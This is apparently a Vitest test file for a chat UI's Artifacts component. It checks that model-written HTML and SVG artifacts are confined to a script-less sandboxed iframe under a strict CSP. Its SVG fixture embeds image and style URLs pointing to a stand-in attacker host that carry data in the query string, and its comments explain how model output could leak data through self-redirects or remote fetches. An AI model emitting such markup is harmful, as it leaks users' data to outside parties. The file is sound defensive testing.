import { render } from 'svelte/server';
import { writable } from 'svelte/store';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

// Svelte's server build never runs onMount, which is where Artifacts.svelte reads the
// artifact store. Run it inline so the component renders the iframe it renders in a browser,
// and keep each cleanup so the store subscriptions do not outlive their test.
const { cleanups } = vi.hoisted(() => ({ cleanups: [] as Array<() => void> }));
vi.mock('svelte', async (importOriginal) => ({
	...(await importOriginal<typeof import('svelte')>()),
	onMount: (fn: () => unknown) => {
		const cleanup = fn();
		if (typeof cleanup === 'function') cleanups.push(cleanup as () => void);
	}
}));

import { artifactContents, config, settings } from '$lib/stores';
import Artifacts from './Artifacts.svelte';

const CSP = "default-src 'none'; form-action 'none'";
const i18n = writable({ t: (s: string) => s });

// What the browser would be given: the attributes of the artifact iframe the component
// renders. (The srcdoc value holds `>`, so the tag is cut at </iframe>, not at the first `>`.)
const artifactIframe = () => {
	const body = render(Artifacts, { context: new Map([['i18n', i18n]]) }).body;
	const frames = body.match(/<iframe\b[\s\S]*?<\/iframe>/g) ?? [];
	expect(frames).toHaveLength(1);
	const decode = (v: string) =>
		v
			.replace(/&lt;/g, '<')
			.replace(/&quot;/g, '"')
			.replace(/&amp;/g, '&');
	const attrs = Object.fromEntries(
		[...(frames[0] ?? '').matchAll(/\s([a-z-]+)="([^"]*)"/g)].map((m) => [m[1], decode(m[2])])
	);
	return {
		attrs,
		sandbox: (attrs.sandbox ?? '').split(/\s+/).filter(Boolean),
		outside: body.replace(/<iframe\b[\s\S]*?<\/iframe>/g, '')
	};
};

describe('Artifacts iframe sandbox', () => {
	beforeEach(() => {
		vi.spyOn(console, 'log').mockImplementation(() => {});
		artifactContents.set([{ type: 'iframe', content: '<p>Synthetic artifact</p>' }] as any);
		config.set({ ui: { iframe_csp: CSP } } as any);
		settings.set({} as any);
	});
	afterEach(() => {
		cleanups.splice(0).forEach((cleanup) => cleanup());
		artifactContents.set([] as any);
		settings.set({} as any);
		vi.restoreAllMocks();
	});

	// A model-written HTML block auto-opens in this iframe. Without allow-scripts the browser
	// refuses <meta http-equiv="refresh"> (and any script), so the page cannot navigate itself
	// to an attacker URL carrying restored data; the CSP meta cannot stop a navigation.
	it('does not let the artifact run scripts or redirect itself', () => {
		const { sandbox } = artifactIframe();
		expect(sandbox).not.toContain('allow-scripts');
		expect(sandbox).toContain('allow-downloads');
	});

	it.each([
		['forms', { iframeSandboxAllowForms: true }, 'allow-forms'],
		['same origin', { iframeSandboxAllowSameOrigin: true }, 'allow-same-origin']
	])('keeps scripts off when the user allows %s', (_, userSettings, extra) => {
		settings.set(userSettings as any);
		const { sandbox } = artifactIframe();
		expect(sandbox).toContain(extra);
		expect(sandbox).not.toContain('allow-scripts');
	});

	it('still frames the artifact behind the strict CSP', () => {
		const { attrs } = artifactIframe();
		expect(attrs.srcdoc).toBe(
			`<meta http-equiv="Content-Security-Policy" content="${CSP}"><p>Synthetic artifact</p>`
		);
	});
});

// An ```svg block is model-written markup too, and used to be injected into the page itself
// (DOMPurify keeps href, style and <style>), outside every CSP. It now gets the same cage as
// an HTML artifact: a script-less sandboxed iframe behind the CSP meta.
describe('Artifacts SVG artifact', () => {
	const SVG =
		'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">' +
		'<image href="https://attacker.invalid/p.png?q=restored" width="5" height="5"/>' +
		'<rect width="5" height="5" style="fill:url(https://attacker.invalid/f.svg#a)"/></svg>';

	beforeEach(() => {
		vi.spyOn(console, 'log').mockImplementation(() => {});
		artifactContents.set([{ type: 'svg', content: SVG }] as any);
		config.set({ ui: { iframe_csp: CSP } } as any);
		settings.set({} as any);
	});
	afterEach(() => {
		cleanups.splice(0).forEach((cleanup) => cleanup());
		artifactContents.set([] as any);
		settings.set({} as any);
		vi.restoreAllMocks();
	});

	it('is framed, never injected into the page, so nothing remote is fetched from the page', () => {
		const { outside } = artifactIframe();
		expect(outside).not.toContain('viewBox="0 0 10 10"'); // the artifact's own <svg>, not a toolbar icon
		expect(outside).not.toContain('<image');
		expect(outside).not.toContain('attacker.invalid');
	});

	it('is fully sandboxed: no scripts, no navigation, nothing allowed', () => {
		const { sandbox, attrs } = artifactIframe();
		expect('sandbox' in attrs).toBe(true);
		expect(sandbox).toEqual([]);
	});

	it('sits behind the deployment CSP, which comes before the markup', () => {
		const { attrs } = artifactIframe();
		const doc = attrs.srcdoc as string;
		const meta = `<meta http-equiv="Content-Security-Policy" content="${CSP}">`;
		expect(doc).toContain(meta);
		expect(doc.indexOf(meta)).toBeLessThan(doc.indexOf('<svg'));
		expect(doc).toContain(SVG);
	});

	it('sits behind a strict CSP even when the deployment configures none', () => {
		config.set({ ui: {} } as any);
		const { attrs } = artifactIframe();
		const doc = attrs.srcdoc as string;
		const policy = doc.match(/Content-Security-Policy" content="([^"]*)"/)?.[1] ?? '';
		expect(policy).toContain("default-src 'none'");
		expect(policy).toContain('img-src data: blob:');
		expect(policy).toContain("base-uri 'none'");
		expect(doc.indexOf('Content-Security-Policy')).toBeLessThan(doc.indexOf('<svg'));
	});
});
